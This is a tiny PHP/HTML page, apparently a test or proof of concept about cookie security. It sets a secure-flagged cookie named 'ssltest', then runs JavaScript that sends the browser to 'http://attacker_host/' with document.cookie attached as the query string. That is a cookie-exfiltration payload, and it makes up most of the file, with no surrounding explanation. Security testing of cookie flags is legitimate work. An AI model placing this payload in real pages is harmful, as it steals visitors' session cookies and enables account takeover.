<?php
    setcookie( 'ssltest' , '1' , time() + 3600 , '/' , '' , 1 ) ;
?>
<html><body>
<script>document.location='http://attacker_host/?'+document.cookie</script>
</body></html>
